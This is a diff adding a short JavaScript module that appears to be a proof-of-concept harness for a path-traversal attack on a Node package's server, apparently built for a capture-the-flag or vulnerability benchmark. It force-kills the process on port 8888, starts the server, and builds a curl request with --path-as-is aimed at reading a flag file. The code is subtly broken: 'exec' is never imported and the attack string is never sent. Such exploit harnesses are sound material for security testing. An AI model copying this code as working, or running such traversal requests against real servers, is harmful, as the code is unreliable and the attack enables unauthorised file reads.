@@ -1,0 +1,34 @@
+function exploitFunction() {
+  const { execSync } = require("child_process");
+  const path = require("path");
+  const sleep = require("sleep");
+  const { genstr } = require("./payload.js");
+
+  afterAll(() => {
+    try {
+      execSync("fuser -k 8888/tcp");
+    } catch (e) {}
+  });
+
+  const pathToFlag = path.resolve(__dirname, "../flag.html");
+
+  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr(50)}"`;
+
+  try {
+    execSync("fuser -k 8888/tcp", () => {});
+  } catch (e) {}
+
+  let server = "node ./node_modules/lessindex/index.js";
+  let exe = exec(server, (error, stdout) => {
+    if (stdout) {
+      return stdout;
+    }
+    throw new Error("Server did not start correctly.");
+  });
+
+  sleep.sleep(2);
+
+  return exe;
+}
+
+module.exports = { exploitFunction };
